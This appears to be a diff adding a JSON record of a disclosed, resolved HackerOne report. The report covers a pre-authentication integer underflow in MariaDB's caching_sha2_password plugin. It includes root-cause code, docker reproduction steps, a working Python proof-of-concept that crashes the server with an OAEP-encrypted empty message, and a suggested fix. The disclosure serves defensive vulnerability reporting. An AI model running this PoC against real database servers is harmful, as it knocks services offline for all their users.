@@ -1,0 +1,135 @@
+{
+  "id": 3781201,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzgxMjAx",
+  "url": "https://hackerone.com/reports/3781201",
+  "title": "Pre-authentication `size_t` integer underflow → out-of-bounds read / server crash in MariaDB `caching_sha2_password` (auth_mysql_sha2) via an RSA-OAEP",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-06-04T04:30:45.470Z",
+  "submitted_at": "2026-06-04T04:30:46.479Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vnth4nhnt",
+    "url": "/vnth4nhnt",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0oncuppgs1y84cnoufmqwoizjmmq/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-07T19:54:09.157Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:54:07.349Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\nThe `caching_sha2_password` server plugin, on a plaintext TCP connection, RSA-decrypts the client's password reply and sets `pkt_len = (int)plain_text_len` without checking for an empty plaintext. It then calls `sha256_crypt_r(pkt, pkt_len - 1, ...)` where the second parameter is `size_t`. An unauthenticated attacker who RSA-OAEP-encrypts a zero-length message with the server's public key makes `plain_text_len == 0`, so `pkt_len - 1` underflows to `SIZE_MAX`; the SHA-256 routine then reads `SIZE_MAX` bytes from a small stack buffer, causing an out-of-bounds read and SIGSEGV that crashes the entire server. The crash occurs during password verification, before any credential comparison, so no valid password is needed.\n\n### Root Cause\n`plugin/auth_mysql_sha2/mysql_sha2.c` (server `auth()`):\n```c\nunsigned char plain_text[1025];\nsize_t plain_text_len = sizeof(plain_text) - 1;\n...\nif (vio_info.protocol == MYSQL_VIO_TCP && !vio_info.tls) {     // plaintext TCP + RSA keys\n    ...                                                        // (server serves public key on request '\\2')\n    if (ssl_decrypt(private_key, pkt, pkt_len, plain_text, &plain_text_len))  // OAEP; sets len=0 for empty msg\n        return CR_ERROR;\n    for (size_t i=0; i < plain_text_len; i++) plain_text[i]^= scramble[i % SCRAMBLE_LENGTH];\n    pkt = plain_text;\n    pkt_len = (int)plain_text_len;                             // attacker-controlled -> 0\n}\nauthstr = (struct digest*)info->auth_string;\nsha256_crypt_r(pkt, pkt_len-1, authstr->salt, sizeof(authstr->salt), to, authstr->iterations);  // 0-1 -> (size_t)-1\n```\n`sha256_crypt_r(const char *key, size_t key_len, ...)` in `plugin/auth_mysql_sha2/sha256crypt.c`:\n```c\nunsigned char *p_bytes = my_safe_alloca(key_len);             // my_malloc(SIZE_MAX) -> NULL\nmy_sha256_multi(alt, key, key_len, salt, salt_len, key, key_len, NULL);  // reads key_len=SIZE_MAX bytes -> OOB\n```\n`ssl_decrypt` uses `RSA_PKCS1_OAEP_PADDING` and faithfully returns `dstlen = 0` for an OAEP-encrypted empty message, so `plain_text_len` becomes 0. There is no `pkt_len <= 0` / `plain_text_len == 0` guard before the `pkt_len - 1` subtraction.\n\n### Steps To Reproduce\nPrerequisites (normal MySQL-compatibility config — `caching_sha2_password` in use over plaintext TCP, RSA keys present):\n1. Load the plugin: `INSTALL SONAME 'auth_mysql_sha2';`\n2. Restart the server so the plugin is loaded at startup and its RSA keys auto-generate (`caching_sha2_password_auto_generate_rsa_keys=ON` by default → `private_key.pem`/`public_key.pem` are created in the data directory). The keys are NOT generated by a runtime `INSTALL`, so this restart is required.\n3. Create an account that authenticates via the plugin, with a password set (do this after step 2 so a valid hash is stored): `CREATE USER sha2u@'%' IDENTIFIED VIA caching_sha2_password USING PASSWORD('secret123');` — confirm with `SHOW CREATE USER sha2u@'%';` (must show a non-empty `USING '$A$005$…'` hash).\n\nThen, as an UNAUTHENTICATED network client (no valid password), drive the `caching_sha2_password` full-auth exchange over plaintext TCP and, at the final step, send an RSA-OAEP encryption of an EMPTY message instead of an encrypted password (a ~30-line raw-protocol script is provided: `poc/poc_sha2_min.py`, requires Python `cryptography`). In outline: connect → declare user `sha2u` (→ server AuthSwitch to `caching_sha2_password`) → send a 32-byte first reply (passes the `pkt_len == SHA256_DIGEST_LENGTH` gate) → server replies `perform_full_authentication` → request the public key → send `OAEP(b\"\")`. This makes `plain_text_len == 0`, so `pkt_len - 1` underflows to `SIZE_MAX`.\n\nObserved live (official `mariadb:12.3.2`):\n```\n260603 19:27:08 [ERROR] mariadbd got signal 11 ;\n  ... libcrypto SHA256_Update+0x12e\n  my_sha256_multi+0xee\n  auth_mysql_sha2.so(sha256_crypt_r+0x1db)\n  acl_authenticate ... do_handle_one_connection ... handle_one_connection\n```\nContainer state: `Exited (139)` (= 128+SIGSEGV; OOMKilled=false). The whole server is down for all clients; it recovers only on restart.\n\nIn details\n\n```bash\n# 1. start MariaDB 12.3.2, wait until ready\ndocker rm -f mariadb 2>/dev/null\ndocker run -d --name mariadb -e MARIADB_ROOT_PASSWORD=root -p 127.0.0.1:13306:3306 mariadb:latest\nuntil docker exec mariadb mariadb -uroot -proot -e \"SELECT 1\" >/dev/null 2>&1; do sleep 2; done\n\n# 2. install the plugin\ndocker exec mariadb mariadb -uroot -proot -e \"INSTALL SONAME 'auth_mysql_sha2';\"\n\n# 3. RESTART so the plugin loads at startup -> auto-generates the RSA keys\ndocker restart mariadb\nuntil docker exec mariadb mariadb -uroot -proot -e \"SELECT 1\" >/dev/null 2>&1; do sleep 2; done\ndocker exec mariadb sh -c 'ls /var/lib/mysql/*.pem' # must show private_key.pem + public_key.pem\n\n# 4. NOW create the user (plugin healthy -> hash is stored correctly)\ndocker exec mariadb mariadb -uroot -proot -e \\\n\"CREATE USER sha2u@'%' IDENTIFIED VIA caching_sha2_password USING PASSWORD('secret123');\"\ndocker exec mariadb mariadb -uroot -proot -e \"SHOW CREATE USER sha2u@'%';\" # must show ... USING '\\$A\\$005\\$...'(non-empty hash)\n\n# 5. fire the PoC (unauthenticated, no password) and confirm the crash\ndocker exec mariadb mariadb -uroot -proot -e \"SELECT 'UP_BEFORE' s;\"\npython3 poc/poc_sha2_min.py # -> [+] connection died after ciphertext (= SIGSEGV)\ndocker inspect mariadb --format 'exit={{.State.ExitCode}}'# -> exit=139\n\n```\n\nWith `poc_sha2_min.py`\n\n```python\n#!/usr/bin/env python3\n# MariaDB caching_sha2_password pre-auth DoS (size_t underflow), minimal PoC.\n# Sends an RSA-OAEP encryption of an EMPTY message -> server computes\n# sha256_crypt_r(pkt, pkt_len-1 = SIZE_MAX) -> my_sha256_multi OOB read -> SIGSEGV.\n# Precondition: target has a caching_sha2_password account; plaintext TCP; RSA keys (auto-generated by default).\n# No valid password required (crash happens before credential comparison).\nimport socket, struct\nfrom cryptography.hazmat.primitives.asymmetric import padding\nfrom cryptography.hazmat.primitives import hashes, serialization\n\ns = socket.create_connection((\"127.0.0.1\", 13306))                 # 1. connect to MariaDB\n\ndef recv():                                                        #    read one packet: [3B length][1B seq][payload]\n    h = s.recv(4)\n    if len(h) < 4: raise EOFError(\"server closed early (setup issue: sha2u needs a valid \"\n                                  \"caching_sha2_password hash AND RSA keys must exist)\")\n    n = h[0] | h[1] << 8 | h[2] << 16; return h[3], s.recv(n)\ndef send(seq, body):                                               #    send one packet with the given sequence number\n    s.sendall(struct.pack(\"<I\", len(body))[:3] + bytes([seq & 255]) + body)\n\nseq, _ = recv()                                                    # 2. read the server handshake\ncaps = 1 | 0x200 | 0x8000 | 0x80000                                #    LONG_PASSWORD|PROTOCOL_41|SECURE_CONN|PLUGIN_AUTH\nhsr  = struct.pack(\"<IIB\", caps, 0xFFFFFF, 45) + b\"\\x00\"*23 \\\n       + b\"sha2u\\x00\" + b\"\\x00\" + b\"mysql_native_password\\x00\"     #    declare user 'sha2u', empty auth response\nsend(seq + 1, hsr)                                                 # 3. -> server issues AuthSwitch to caching_sha2_password\n\nseq, _ = recv()                                                    # 4. read AuthSwitchRequest\nsend(seq + 1, b\"A\" * 32)                                           # 5. send exactly 32 bytes (passes the pkt_len==SHA256_DIGEST_LENGTH gate)\n\nseq, _ = recv()                                                    # 6. server replies \\x04 (perform_full_authentication)\nsend(seq + 1, b\"\\x02\")                                             # 7. request the RSA public key (request_public_key)\n\nseq, p = recv()                                                    # 8. server returns the public key (0x01-prefixed)\npub = serialization.load_pem_public_key(p[1:] if p[:1] == b\"\\x01\" else p)\nct  = pub.encrypt(b\"\", padding.OAEP(                               # 9. *** RSA-OAEP encryption of an EMPTY message ***\n        mgf=padding.MGF1(hashes.SHA1()), algorithm=hashes.SHA1(), label=None))\nsend(seq + 1, ct)                                                  # 10. send -> plain_text_len=0 -> pkt_len-1=SIZE_MAX -> crash\n\ntry: recv(); print(\"server replied — NO crash (unexpected)\")\nexcept Exception as e: print(f\"[+] connection died after ciphertext: {e!r}  (= server SIGSEGV)\")\n```\n\n### Remediation\nIn `mysql_sha2.c auth()`, reject an empty/short decrypted reply before the subtraction, e.g. `if (pkt_len < 1) return CR_ERROR;` after the decrypt block (and after the non-RSA `read_packet`). Defensively, make `sha256_crypt_r` treat `key_len == 0` safely. Add a regression test that sends an OAEP-encrypted empty message to a `caching_sha2_password` account.\n\n## Impact\n\nAny network client that can reach port 3306 crashes the entire MariaDB instance with a single connection and no valid credentials, as long as some account uses `caching_sha2_password` (typical for MySQL-compatible deployments) and TLS is not enforced on the connection. Full denial of service for all clients; trivially repeatable.",
+  "weakness": {
+    "id": 16,
+    "name": "Integer Underflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6036460,
+      "file_name": "Recording_1.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6xurbjir843908hhx5deya54i98n?response-content-disposition=attachment%3B%20filename%3D%22Recording_1.mp4%22%3B%20filename%2A%3DUTF-8%27%27Recording_1.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTR3PACS6%2F20261007%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261007T210908Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEsaCXVzLXdlc3QtMiJIMEYCIQD9Ryeq7XNhfWJCTUUU0G5Gru8MJNs34RVEf7Fv6z9VRgIhAJOBDKFHIee7JkJLhnPPVvkKZUu9ruOwpwh%2B4aR8Xeu1KrIFCBQQAxoMMDEzNjE5Mjc0ODQ5Igzjtex8E2bnwsUK%2FN4qjwVP7ffk5LSTLbgMi5oduzG%2Fapz6XdNDC%2BDCFytEXqdxMea2r58Yol%2Fjy5bb7h2IetkjoZSPWt5hSegwSeiGtpRlruYV28aqLN9GR0y705IQWi07XvcXUdyZHusvBS1%2ByPg%2Bvt9iCwPY3macYJaLbMcQxGZMrRtFOQI7yihcGClKpmkTPekAoAM0LY0LtngAVZg8BrOYz%2B3oX59lEjKNBz2s4%2Bushxb9dt6jJipnQjNwPpfJIj2%2B0XwkguVEw%2Bzc%2Bt%2Be6W1lFCsQX%2FsnvaSfHnQlCMrkqzQEqPmuEpQbW2Kn74HK3CcO%2BHW8D8SgTtPf1J%2B%2FGeQxTEqhKgdebIUu5LiijSRFclSU5JmnOYT2RVbgGwCnQfGlQGRGzZ6zhp%2FRdGgYrj9xR%2BKp6lHJqe3vzlWS51nXx2ZwP13dv1DN9j58neCDESUuhgbpqzoudobBoMcuETsEhLdAmMX9NLZhLuMtMrwyOuM4igqDkx0htwcu9bR53BhdBUx%2BsBpbUfFxjDcVTAizmyAwPcxZASs3HkmApa3Hv2tJJydLw9D72LbSSHMJh70nw9z9WzgYjqXKh9SzyY8Zv89cVMXRbjrF4uMXPuFXe78WEsJY6Akc2kNnz8gxGUAzYoVboNUhWLm%2B0qeYnifzUHJhBURVTVHUA5fItidhBPfSmfDm3FytH8Tkqy%2FF6XDwmN2G6XA4YG%2BvNaA4Hr7SY8mw2lkyXNXe3b%2FOKgiBw0usQDIHH3g1vxjI%2BlD410m4D2o6Zy%2Bu2J768BH%2FjqmQzHXx3yO4ZcfOC5xH7ZJigUxPQcqYe5HVbkOxh2dhI3ZLI2bRGKKU7i%2F64%2BQHulH3AbOH3nX8wX5sFBU9KF8DjjfDcEDVXhT0%2FMiNMMSpmtYGOrABP0fO%2F6snn6D2KuSSvRi7gja5pingBAUHDiZewOkB4m7lRlyymmEgSYrUNRshFS%2B56sNT%2Fedeq2npsMtfGuX%2BvIhQG9pSVLE8TcjE89wd3CmvWrvljqfXVfd3NeEBYsZul8%2FsvKz0%2BZYw5feFt3trDh0omiC7OAtNYn12RvKUsLv5r7%2FLSViUKrVJY39fa%2FwNfqo%2BXaqqL0iVIjxt8iW%2BtZKfERed5Em%2FYffSmk0xY6g%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84b1bdfe13ad3550730b51ef63eddbb634d359513f5374671ca2252c65d05e3a",
+      "file_size": 63347978,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-10-07T19:54:07.556Z",
+  "allow_singular_disclosure_after": -4500.81266707,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "vnth4nhnt"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10337,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors  - Denial of Service",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
